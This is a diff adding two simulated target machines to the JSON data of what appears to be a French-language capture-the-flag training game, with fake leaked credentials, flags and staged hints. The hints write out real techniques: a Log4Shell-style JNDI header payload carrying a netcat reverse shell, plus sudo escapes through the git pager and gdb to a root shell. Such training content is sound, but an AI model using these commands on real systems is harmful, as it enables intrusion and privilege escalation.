@@ -1896,6 +1896,249 @@
     }
   },
   {
+    "id": "relic",
+    "name": "RELIC",
+    "ip": "10.10.11.140",
+    "difficulty": "Moyen",
+    "os": "Linux (Ubuntu 22.04)",
+    "briefing": "Un service interne de génération de rapports, encore en version de développement. Le dossier `.git` du dépôt a été déployé par erreur en même temps que l'application.",
+    "ports": [
+      {
+        "port": 22,
+        "proto": "tcp",
+        "state": "open",
+        "service": "ssh",
+        "version": "OpenSSH 8.9p1 Ubuntu"
+      },
+      {
+        "port": 80,
+        "proto": "tcp",
+        "state": "open",
+        "service": "http",
+        "version": "Relic Reports (dev build)"
+      }
+    ],
+    "web": {
+      "/": "<html>\n<head><title>Relic Reports</title></head>\n<body>\n<h1>Relic Reports (dev build)</h1>\n<p>Environnement de préproduction — ne pas utiliser en production.</p>\n<!-- déploiement effectué avec rsync depuis le dossier de travail, dossier .git inclus par erreur -->\n</body>\n</html>",
+      "/.git/HEAD": "ref: refs/heads/main\n",
+      "/.git/config": "[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n[remote \"origin\"]\n\turl = git@git.solenne-holdings.local:internal/relic-reports.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n"
+    },
+    "ftp": {
+      "enabled": false
+    },
+    "gitLeak": {
+      "commits": [
+        {
+          "hash": "1a2b3c4d5e6f7089a1b2c3d4e5f60718293a4b5c",
+          "message": "Initial commit: scaffold reporting service",
+          "diff": "diff --git a/README.md b/README.md\nnew file mode 100644\n+++ b/README.md\n+# Relic Reports\n+Service interne de génération de rapports (dev build)."
+        },
+        {
+          "hash": "2b3c4d5e6f70819a2b3c4d5e6f7081920a3b4c5d",
+          "message": "Add deploy script",
+          "diff": "diff --git a/deploy.sh b/deploy.sh\nnew file mode 100755\n+++ b/deploy.sh\n+#!/bin/bash\n+rsync -av ./build/ prod:/srv/relic/"
+        },
+        {
+          "hash": "3c4d5e6f7081920a3b4c5d6e7f8091a2b3c4d5e6",
+          "message": "WIP: config file for staging env",
+          "diff": "diff --git a/config/staging.yml b/config/staging.yml\nnew file mode 100644\n+++ b/config/staging.yml\n+env: staging\n+db_host: 127.0.0.1"
+        },
+        {
+          "hash": "4d5e6f7081920a3b4c5d6e7f8091a2b3c4d5e6f7",
+          "message": "oops: hardcoded ssh creds for the demo, will remove before merge",
+          "diff": "diff --git a/config/staging.yml b/config/staging.yml\n+++ b/config/staging.yml\n+ssh_user: gkessler\n+ssh_pass: R3lic_G1t_H1st0ry!41"
+        },
+        {
+          "hash": "5e6f7081920a3b4c5d6e7f8091a2b3c4d5e6f708",
+          "message": "fix: remove hardcoded creds from staging.yml",
+          "diff": "diff --git a/config/staging.yml b/config/staging.yml\n-ssh_user: gkessler\n-ssh_pass: R3lic_G1t_H1st0ry!41\n+# creds now injected via CI secret at deploy time"
+        },
+        {
+          "hash": "6f7081920a3b4c5d6e7f8091a2b3c4d5e6f70819",
+          "message": "chore: bump dependencies",
+          "diff": "diff --git a/package.json b/package.json\n-\"version\": \"0.3.1\"\n+\"version\": \"0.3.2\""
+        }
+      ]
+    },
+    "sshUsers": {
+      "gkessler": {
+        "password": "R3lic_G1t_H1st0ry!41"
+      }
+    },
+    "targetFS": {
+      "hostname": "relic",
+      "homeDir": "/home/gkessler",
+      "users": {
+        "gkessler": {
+          "home": "/home/gkessler",
+          "fs": {
+            "user.txt": {
+              "type": "file",
+              "content": "FLAG{relic_acces_initial_git_history_leak}",
+              "perms": "-rw-r-----",
+              "owner": "gkessler"
+            },
+            ".bash_history": {
+              "type": "file",
+              "content": "id\nsudo -l\nexit",
+              "perms": "-rw-------",
+              "owner": "gkessler"
+            },
+            "notes.txt": {
+              "type": "file",
+              "content": "Pense-bête : sudo -l m'autorise git en NOPASSWD -- pratique pour consulter des diffs en root sans mot de passe. GTFOBins en pense autre chose.",
+              "perms": "-rw-r--r--",
+              "owner": "gkessler"
+            },
+            "note_interne.txt": {
+              "type": "file",
+              "content": "Note interne — Solenne Holdings\nLe dossier .git a été déployé par erreur sur trois environnements différents depuis le début de l'année. R. Kade l'avait signalé la première fois -- et les deux suivantes aussi, sans succès.",
+              "perms": "-rw-r--r--",
+              "owner": "gkessler"
+            }
+          }
+        }
+      },
+      "extraFS": {},
+      "sudoL": "L'utilisateur gkessler peut lancer les commandes suivantes sur relic :\n    (root) NOPASSWD: /usr/bin/git"
+    },
+    "privesc": {
+      "type": "sudo-gtfobins",
+      "exploit": {
+        "tool": "sudo",
+        "bin": "git",
+        "pager": true
+      },
+      "pagerEscapeRegex": {
+        "__regex__": "^!\\/?(bin\\/)?sh$|^!bash$",
+        "__flags__": ""
+      },
+      "enterMsg": "(le pager git s'est ouvert avec les droits root -- même mécanique que less/man)\n\nAstuce : depuis le pager, échappe vers un shell avec !sh"
+    },
+    "rootFile": {
+      "path": "/root/root.txt",
+      "content": "FLAG{relic_root_git_gtfobins}"
+    },
+    "hints": {
+      "recon": [
+        "Le site précise que le déploiement se fait par simple copie du dossier de travail -- vérifie ce qui a pu partir avec.",
+        "Essaie `curl http://10.10.11.140/.git/HEAD` : si ça répond, le dépôt entier est exposé, pas seulement ce fichier.",
+        "Un dépôt `.git` exposé se navigue avec les commandes dédiées `git log <ip>` et `git show <ip> <hash>` (simulées, pas un vrai clone)."
+      ],
+      "access": [
+        "`git log 10.10.11.140` liste tous les commits -- lis bien les messages, l'un d'eux s'excuse presque de son contenu.",
+        "Un commit qui dit \"sera retiré avant le merge\" mérite un `git show` : le contenu original reste lisible dans l'historique même après un commit correctif.",
+        "`git show 10.10.11.140 <hash>` (les premiers caractères du hash suffisent) affiche le diff complet -- un des commits fuite des identifiants SSH en clair."
+      ],
+      "privesc": [
+        "`sudo -l` une fois connecté : une seule commande NOPASSWD, en lien avec le sujet de la machine.",
+        "`git` ouvre un pager quand on lui demande de l'aide (`git -p help config`) -- la même mécanique GTFOBins que less/man.",
+        "Lance `sudo git -p help config`, puis `!sh` dans le pager pour obtenir un shell root."
+      ]
+    }
+  },
+  {
+    "id": "echolog",
+    "name": "ECHOLOG",
+    "ip": "10.10.11.205",
+    "difficulty": "Difficile",
+    "os": "Linux (Ubuntu 22.04)",
+    "briefing": "Un service de journalisation centralisée pour l'infra interne. Il logue consciencieusement chaque en-tête de requête... y compris ceux qui ne devraient jamais être évalués.",
+    "ports": [
+      {
+        "port": 22,
+        "proto": "tcp",
+        "state": "open",
+        "service": "ssh",
+        "version": "OpenSSH 8.9p1 Ubuntu"
+      },
+      {
+        "port": 8081,
+        "proto": "tcp",
+        "state": "open",
+        "service": "http",
+        "version": "Echolog Ingest (Java / bibliothèque de logs non patchée)"
+      }
+    ],
+    "web": {
+      "/": "<html>\n<head><title>Echolog Ingest</title></head>\n<body>\n<h1>Echolog Ingest</h1>\n<p>Point d'entrée de journalisation centralisée. Toute requête sur /api/status est loguée telle quelle (en-têtes compris).</p>\n<!-- ticket ouvert depuis 4 mois : mettre à jour la lib de logs (CVE connue) -->\n</body>\n</html>"
+    },
+    "ftp": {
+      "enabled": false
+    },
+    "jndi": {
+      "path": "/api/status",
+      "header": "user-agent",
+      "injectRegex": {
+        "__regex__": "\\$\\{jndi:(?:ldap|ldaps|rmi):\\/\\/[^}]*\\}",
+        "__flags__": "i"
+      },
+      "user": "svc_logger"
+    },
+    "sshUsers": {},
+    "targetFS": {
+      "hostname": "echolog",
+      "homeDir": "/home/svc_logger",
+      "users": {
+        "svc_logger": {
+          "home": "/home/svc_logger",
+          "fs": {
+            "user.txt": {
+              "type": "file",
+              "content": "FLAG{echolog_acces_initial_jndi_rce}",
+              "perms": "-rw-r--r--",
+              "owner": "svc_logger"
+            },
+            ".bash_history": {
+              "type": "file",
+              "content": "id\nsudo -l\nexit",
+              "perms": "-rw-------",
+              "owner": "svc_logger"
+            },
+            "note_interne.txt": {
+              "type": "file",
+              "content": "Note interne — Solenne Holdings\nLa mise à jour de la bibliothèque de logs traîne depuis le départ précipité de R. Kade -- elle avait pourtant classé le ticket en priorité critique, en rouge, souligné deux fois.",
+              "perms": "-rw-r--r--",
+              "owner": "svc_logger"
+            }
+          }
+        }
+      },
+      "extraFS": {},
+      "sudoL": "L'utilisateur svc_logger peut lancer les commandes suivantes sur echolog :\n    (root) NOPASSWD: /usr/bin/gdb"
+    },
+    "privesc": {
+      "type": "sudo-direct",
+      "exploit": {
+        "tool": "sudo",
+        "bin": "gdb",
+        "raw": "sudo gdb -nx -ex '!sh' -ex quit"
+      },
+      "enterMsg": "# (shell root obtenu via gdb -- technique GTFOBins)"
+    },
+    "rootFile": {
+      "path": "/root/root.txt",
+      "content": "FLAG{echolog_root_gdb_gtfobins}"
+    },
+    "hints": {
+      "recon": [
+        "Le commentaire du code source avoue lui-même que la bibliothèque de logs n'est pas à jour -- pense à une CVE célèbre sur l'évaluation de lookups dans les logs.",
+        "L'endpoint `/api/status` journalise les en-têtes de la requête tels quels, y compris `User-Agent` -- un terrain connu pour ce genre de faille.",
+        "Un lookup `${jndi:ldap://...}` glissé dans un en-tête peut être évalué côté serveur au lieu d'être simplement écrit dans un fichier de log (façon Log4Shell, CVE-2021-44228)."
+      ],
+      "access": [
+        "Mets-toi d'abord en écoute : `nc -lvnp 4444`.",
+        "Le lookup JNDI accepte d'embarquer un callback vers ta machine -- vise ton IP d'attaquant et le port en écoute.",
+        "Envoie `curl -H 'User-Agent: ${jndi:ldap://10.10.14.1:1389/x;nc 10.10.14.1 4444 -e /bin/sh}' http://10.10.11.205:8081/api/status` (même port des deux côtés, guillemets simples obligatoires pour ne pas déclencher l'expansion de variable du shell). Tu obtiens un shell svc_logger."
+      ],
+      "privesc": [
+        "`sudo -l` une fois connecté : une seule commande NOPASSWD, pas franchement anodine à autoriser sans mot de passe.",
+        "`gdb` peut exécuter une commande shell depuis son interpréteur de commandes avec `!sh` -- GTFOBins en fait un raccourci direct vers un shell root.",
+        "Lance `sudo gdb -nx -ex '!sh' -ex quit` pour obtenir un shell root."
+      ]
+    }
+  },
+  {
     "id": "axiom",
     "name": "AXIOM",
     "ip": "10.10.11.244",
